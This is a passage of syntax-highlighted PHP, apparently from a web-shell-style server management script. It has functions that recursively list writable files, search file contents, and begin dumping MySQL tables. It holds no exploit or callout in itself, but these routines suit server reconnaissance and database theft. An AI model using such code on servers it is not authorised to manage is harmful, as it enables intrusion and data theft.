<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">closedir(</span>$<span style="color: #f0c674;">dh</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">clearstatcache(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">dirdata</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">GetWFileList</span>($<span style="color: #f0c674;">dir</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">filedata</span>,$<span style="color: #f0c674;">j</span>,$<span style="color: #f0c674;">nowpath</span>, $<span style="color: #f0c674;">writabledb</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">j</span> &amp;&amp; $<span style="color: #f0c674;">j</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">dh</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">opendir(</span>$<span style="color: #f0c674;">dir</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> ($<span style="color: #f0c674;">file</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">readdir(</span>$<span style="color: #f0c674;">dh</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">ext</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">getext(</span>$<span style="color: #f0c674;">file</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">f</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">'//'</span>,<span style="color: #8abeb7;">'/'</span>,$<span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; $<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">is_dir(</span>$<span style="color: #f0c674;">f</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">GetWFileList(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>($<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; $<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">is_file(</span>$<span style="color: #f0c674;">f</span>) &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">in_array(</span>$<span style="color: #f0c674;">ext</span>, <span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">explode(</span><span style="color: #8abeb7; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">is_writable(</span>$<span style="color: #f0c674;">f</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filename'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span>$<span style="color: #f0c674;">nowpath</span>,<span style="color: #8abeb7;">''</span>,$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'size'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">sizecount(</span>@<span style="color: #c5c8c6; background-color: #1d1f21;">filesize(</span>$<span style="color: #f0c674;">f</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">filemtime(</span>$<span style="color: #f0c674;">f</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filechmod'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getChmod(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'fileperm'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getPerms(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'fileowner'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getUser(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirlink'</span>]=$<span style="color: #f0c674;">dir</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'server_link'</span>]=$<span style="color: #f0c674;">f</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">j</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">closedir(</span>$<span style="color: #f0c674;">dh</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">clearstatcache(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">filedata</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">GetSFileList</span>($<span style="color: #f0c674;">dir</span>, $<span style="color: #f0c674;">content</span>, $<span style="color: #f0c674;">re</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">filedata</span>,$<span style="color: #f0c674;">j</span>,$<span style="color: #f0c674;">nowpath</span>, $<span style="color: #f0c674;">writabledb</span>;
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">j</span> &amp;&amp; $<span style="color: #f0c674;">j</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">dh</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">opendir(</span>$<span style="color: #f0c674;">dir</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> ($<span style="color: #f0c674;">file</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">readdir(</span>$<span style="color: #f0c674;">dh</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">ext</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">getext(</span>$<span style="color: #f0c674;">file</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">f</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span><span style="color: #8abeb7;">'//'</span>,<span style="color: #8abeb7;">'/'</span>,$<span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>.$<span style="color: #f0c674;">file</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; $<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">is_dir(</span>$<span style="color: #f0c674;">f</span>)){
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">GetSFileList(</span>$<span style="color: #f0c674;">f</span>, $<span style="color: #f0c674;">content</span>, $<span style="color: #f0c674;">re</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span>($<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; $<span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">is_file(</span>$<span style="color: #f0c674;">f</span>) &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">in_array(</span>$<span style="color: #f0c674;">ext</span>, <span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">explode(</span><span style="color: #8abeb7; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #f0c674; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">find</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">re</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ( <span style="color: #c5c8c6; background-color: #1d1f21;">preg_match(</span><span style="color: #8abeb7;">'@'</span>.$<span style="color: #f0c674;">content</span>.<span style="color: #8abeb7;">'@'</span>,$<span style="color: #f0c674;">file</span>) || <span style="color: #c5c8c6; background-color: #1d1f21;">preg_match(</span><span style="color: #8abeb7;">'@'</span>.$<span style="color: #f0c674;">c</span><span style="color: #f0c674; text-decoration: underline;">ontent</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'@'</span><span style="text-decoration: underline;">, @</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">file_get_contents(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">f</span><span style="text-decoration: underline;">)) ){</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">find</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ( <span style="color: #c5c8c6; background-color: #1d1f21;">strstr(</span>$<span style="color: #f0c674;">file</span>, $<span style="color: #f0c674;">content</span>) || <span style="color: #c5c8c6; background-color: #1d1f21;">strstr(</span> @<span style="color: #c5c8c6; background-color: #1d1f21;">file_get_contents(</span>$<span style="color: #f0c674; text-decoration: underline;">f</span><span style="text-decoration: underline;">),$</span><span style="color: #f0c674; text-decoration: underline;">content</span><span style="text-decoration: underline;"> ) ) {</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">find</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">find</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filename'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">str_replace(</span>$<span style="color: #f0c674;">nowpath</span>,<span style="color: #8abeb7;">''</span>,$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'size'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">sizecount(</span>@<span style="color: #c5c8c6; background-color: #1d1f21;">filesize(</span>$<span style="color: #f0c674;">f</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">filemtime(</span>$<span style="color: #f0c674;">f</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filechmod'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getChmod(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'fileperm'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getPerms(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'fileowner'</span>]=<span style="color: #c5c8c6; background-color: #1d1f21;">getUser(</span>$<span style="color: #f0c674;">f</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirlink'</span>]=$<span style="color: #f0c674;">dir</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">filedata</span>[$<span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'server_link'</span>]=$<span style="color: #f0c674;">f</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">j</span>++;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">closedir(</span>$<span style="color: #f0c674;">dh</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">clearstatcache(</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> $<span style="color: #f0c674;">filedata</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>);
<span style="background-color: #373b41;"> </span>   }
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">qy</span>($<span style="color: #f0c674;">sql</span>) {<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">mysqllink</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">echo $sql.'&lt;br&gt;';</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = $<span style="color: #f0c674;">error</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(!$<span style="color: #f0c674;">res</span> = @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_query(</span>$<span style="color: #f0c674;">sql</span>,$<span style="color: #f0c674;">mysqllink</span>)) {<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">is_resource(</span>$<span style="color: #f0c674;">res</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">2</span>;
<span style="background-color: #373b41;"> </span>   }<span style="color: #cc6666; background-color: #373b41;">   </span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">q</span>($<span style="color: #f0c674;">sql</span>) {<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">mysqllink</span>;
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> @<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_query(</span>$<span style="color: #f0c674;">sql</span>,$<span style="color: #f0c674;">mysqllink</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">fr</span>($<span style="color: #f0c674;">qy</span>){
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_free_result(</span>$<span style="color: #f0c674;">qy</span>);
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">sizecount</span>($<span style="color: #f0c674;">fileSize</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">size</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">sprintf(</span><span style="color: #8abeb7;">"%u"</span>, $<span style="color: #f0c674;">fileSize</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">size</span> == <span style="color: #c5c8c6; background-color: #1d1f21;">0</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">'0 Bytes'</span> ;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">sizename</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">' Bytes'</span>, <span style="color: #8abeb7;">' KB'</span>, <span style="color: #8abeb7;">' MB'</span>, <span style="color: #8abeb7;">' GB'</span>, <span style="color: #8abeb7;">' TB'</span>, <span style="color: #8abeb7;">' PB'</span>, <span style="color: #8abeb7;">' EB'</span>, <span style="color: #8abeb7;">' ZB'</span>,<span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">' YB'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">round(</span> $<span style="color: #f0c674;">size</span> / <span style="color: #c5c8c6; background-color: #1d1f21;">pow(1024</span>, ($<span style="color: #f0c674;">i</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">floor(log(</span>$<span style="color: #f0c674;">size</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">1024</span>)))), <span style="color: #c5c8c6; background-color: #1d1f21;">2</span>) . $<span style="color: #f0c674;">sizen</span><span style="color: #f0c674; text-decoration: underline;">ame</span><span style="text-decoration: underline;">[$</span><span style="color: #f0c674; text-decoration: underline;">i</span><span style="text-decoration: underline;">];</span>
}
<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">sqldumptable</span>($<span style="color: #f0c674;">table</span>, $<span style="color: #f0c674;">fp</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>) {
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> $<span style="color: #f0c674;">mysqllink</span>;

<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tabledump</span> = <span style="color: #8abeb7;">"DROP TABLE IF EXISTS `$table`;\n"</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">res</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SHOW CREATE TABLE $table"</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">create</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_row(</span>$<span style="color: #f0c674;">res</span>);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tabledump</span> .= $<span style="color: #f0c674;">create</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>].<span style="color: #8abeb7;">";\n\n"</span>;

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">fp</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fwrite(</span>$<span style="color: #f0c674;">fp</span>,$<span style="color: #f0c674;">tabledump</span>);
<span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">tabledump</span>;
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">tabledump</span> = <span style="color: #8abeb7;">''</span>;
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">rows</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">q(</span><span style="color: #8abeb7;">"SELECT * FROM $table"</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> ($<span style="color: #f0c674;">row</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">mysql_fetch_assoc(</span>$<span style="color: #f0c674;">rows</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>($<span style="color: #f0c674;">row</span> <span style="color: #b5bd68;">as</span> $<span style="color: #f0c674;">k</span>=&gt;$<span style="color: #f0c674;">v</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">row</span>[$<span style="color: #f0c674;">k</span>] = <span style="color: #8abeb7;">"'"</span>.@<span style="color: #c5c8c6; background-color: #1d1f21;">mysql_real_escape_string(</span>$<span style="color: #f0c674;">v</span>).<span style="color: #8abeb7;">"'"</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
